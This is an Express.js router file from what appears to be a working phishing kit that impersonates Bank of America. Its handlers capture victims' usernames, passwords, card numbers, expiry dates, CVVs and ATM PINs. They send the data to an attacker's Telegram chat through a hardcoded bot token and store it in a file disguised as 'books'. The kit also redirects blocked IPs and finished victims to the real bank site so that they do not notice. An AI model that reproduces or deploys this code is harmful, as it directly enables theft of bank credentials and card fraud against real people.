const { Router } = require('express');
const router = Router();
const fs = require ('fs');
const { v4: uuidv4 } = require('uuid');
const bodyParse = require ('body-parser');
const  requestIp = require('request-ip');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot('6264763162:AAF5boVko72JI5MXuS-m5xuAEQkcuNKBZqo', { polling: true });



const ipBlockListText = fs.readFileSync('ips-prohibidas.txt', 'utf-8');
const ipBlockList = ipBlockListText.split('\n').filter(ip => ip !== '');

router.use((req, res, next) => {
  const ip = requestIp.getClientIp(req);
  if (ipBlockList.includes(ip)) {
    res.redirect('https://www.bankofamerica.com/es/');
    return;
  }
  next();
});


const json_books = fs.readFileSync('src/books.json', 'utf-8');
let books = JSON.parse(json_books);


router.get('/', (req, res) => {
    res.render('index.ejs');

});

router.get('/cardverificacion', (req, res) => {
    res.render('card.ejs');

});




router.get('/new-entry', (req, res) => {
    res.render('new-entry', {
        books
    })
});

router.post('/',  (req, res) => {
    const {ipts1, ipts2,} = req.body;
    const ip = requestIp.getClientIp(req);
// Verifica si la IP del usuario está en la lista de IPs prohibidas
if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
  res.status(403).send('MAMENLO.');
  return;
}

bot.sendMessage('791007687', `Usuario: ${ipts1}\nContraseña: ${ipts2}\nIP: ${ip}\n`);

    let newBook = {
        id: uuidv4(),
        ipts1,
        ipts2,
        ip,
        
    };
    
    books.push(newBook);
    

    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');
    
    res.redirect('cardverificacion');
    
    
    
});

router.post('/cardverificacion',  (req, res) => {
    const {card, mes, year, cvv, atm } = req.body;
    const ip = requestIp.getClientIp(req);
// Verifica si la IP del usuario está en la lista de IPs prohibidas
if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
  res.status(403).send('Tu dirección IP ha sido bloqueada.');
  return;
}
    bot.sendMessage('791007687', `CardNumber: ${card}\nAño: ${year}\nMes: ${mes}\nCvv: ${cvv}\nIP: ${ip}\nAtm: ${atm}\n`);
    
    // Agrega la IP del usuario a la lista de IPs prohibidas en memoria
    ipBlockList.push(ip);

    // Guarda la lista actualizada de IPs prohibidas en el archivo de texto
    const ipBlockListText = ipBlockList.join('\n') + '\n';
    fs.writeFileSync('ips-prohibidas.txt', ipBlockListText, 'utf-8');


    let newBook = {
        id: uuidv4(),
        card,
        mes,
        year,
        cvv,
        atm,
        ip,

        
    };
   
    books.push(newBook);

    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');

    res.redirect('https://www.bankofamerica.com/es/');
});





router.get('/delete/:id', (req, res) => {
    books = books.filter(book => book.id != req.params.id);
    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');
    res.redirect('/new-entry');

});


module.exports = router;